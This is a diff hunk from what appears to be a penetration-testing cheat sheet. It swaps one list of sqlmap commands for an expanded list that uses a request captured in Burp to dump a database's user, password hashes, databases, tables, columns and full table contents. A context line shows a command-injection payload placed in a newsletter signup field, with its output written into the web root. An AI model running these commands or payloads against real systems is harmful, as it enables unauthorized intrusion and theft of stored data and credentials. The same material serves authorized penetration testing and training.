@@ -60,12 +60,13 @@ Newsletter signup > Subscribe:  joe@gmail.com & ipconfig > C:\inetpub\wwwroot\Bo
 
 Use Burp to trap a request. Copy the request to /root/tmp.
 
-sqlmap -r /root/tmp
-sqlmap -r /root/tmp -p <parameter> --current-user        Show the user the web server is using to talk to the db
-sqlmap -r /root/tmp -p <parameter> -U <user> --passwords
-sqlmap -r /root/tmp --dbs                                Search for all dbs
-sqlmap -r /root/tmp -D <database> --tables               Show all tables in db
-sqlmap -r /root/tmp -D <database> -T <table> --dump      Show all data in table
+sqlmap -r /root/tmp --banner                                              Show webserver OS, apps and db
+sqlmap -r /root/tmp --dbms=<db type> --dbs                                Show all dbs available
+sqlmap -r /root/tmp --dbms=<db type> -p <parameter> --current-user        Show the user the web server is using to talk to the db
+sqlmap -r /root/tmp --dbms=<db type> -p <parameter> -U <user> --passwords
+sqlmap -r /root/tmp --dbms=<db type> -D <database> --tables               Show all tables in a db
+sqlmap -r /root/tmp --dbms=<db type> -D <database> -T <table> --columns   Show all columns in a table
+sqlmap -r /root/tmp --dbms=<db type> -D <database> -T <table> --dump      Show all data in a table     
 ------------------------------------------------------------------------------------------------------
 
 From: http://niiconsulting.com/checkmate/2014/01/from-sql-injection-to-0wnage-using-sqlmap/
